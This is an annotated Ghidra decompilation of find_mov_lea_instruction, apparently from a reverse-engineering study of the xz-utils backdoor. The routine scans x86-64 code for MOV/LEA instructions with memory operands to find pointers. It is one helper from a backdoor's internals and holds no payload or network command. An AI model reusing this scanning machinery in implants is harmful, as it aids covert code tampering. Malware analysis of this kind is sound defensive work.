// /home/kali/xzre-ghidra/xzregh/100D40_find_mov_lea_instruction.c
// Function: find_mov_lea_instruction @ 0x100D40
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_mov_lea_instruction(u8 * code_start, u8 * code_end, BOOL is_64bit_operand, BOOL load_flag, dasm_ctx_t * dctx)


/*
 * AutoDoc: Hybrid MOV/LEA predicate that underpins the pointer scanners.
 * It zeroes the fallback decoder (again via `ctx_clear_idx` / `ctx_clear_cursor`) whenever the caller passes NULL, marches forward either by one byte (decode failure) or by `instruction_size` (success), and insists the ModRM form exposes a memory operand.
 * Opcode `0x10d` (LEA) always qualifies, otherwise it requires the MOV opcode that matches `load_flag` (`0x10b` for loads, `0x109` for stores) and enforces that REX.W matches `is_64bit_operand` unless the caller is searching for stores. Returning TRUE leaves `dctx` describing the matching instruction for downstream helpers.
 */

#include "xzre_types.h"

BOOL find_mov_lea_instruction
               (u8 *code_start,u8 *code_end,BOOL is_64bit_operand,BOOL load_flag,dasm_ctx_t *dctx)

{
  int decoded_opcode;
  BOOL decoded;
  long ctx_clear_idx;
  dasm_ctx_t *ctx_clear_cursor;
  BOOL is_expected_opcode;
  dasm_ctx_t scratch_ctx;
  
  ctx_clear_cursor = &scratch_ctx;
  // AutoDoc: Keep the scratch decoder pristine so stale state never influences later scans.
  for (ctx_clear_idx = 0x16; ctx_clear_idx != 0; ctx_clear_idx = ctx_clear_idx + -1) {
    *(u32 *)&ctx_clear_cursor->instruction = 0;
    ctx_clear_cursor = (dasm_ctx_t *)((long)&ctx_clear_cursor->instruction + 4);
  }
  if (dctx == (dasm_ctx_t *)0x0) {
    dctx = &scratch_ctx;
  }
  do {
    while( TRUE ) {
      if (code_end <= code_start) {
        return FALSE;
      }
      decoded = x86_dasm(dctx,code_start,code_end);
      if (decoded != FALSE) break;
      // AutoDoc: Failed decodes advance byte-by-byte until the next valid opcode appears.
      code_start = code_start + 1;
    }
    if ((((dctx->prefix).decoded.modrm.modrm_word & 0xff00ff00) == 0x5000000) &&
    // AutoDoc: Only accept true memory operands plus the caller-requested width (unless we are hunting stores).
       (((((dctx->prefix).modrm_bytes.rex_byte & 0x48) == 0x48) == is_64bit_operand ||
        (load_flag == FALSE)))) {
      decoded_opcode = *(int *)(dctx->opcode_window + 3);
      if (decoded_opcode == 0x10d) {
        return TRUE;
      }
      if (load_flag == FALSE) {
        is_expected_opcode = decoded_opcode == 0x109;
      }
      else {
        is_expected_opcode = decoded_opcode == 0x10b;
      }
      if (is_expected_opcode) {
        return TRUE;
      }
    }
    code_start = code_start + dctx->instruction_size;
  } while( TRUE );
}

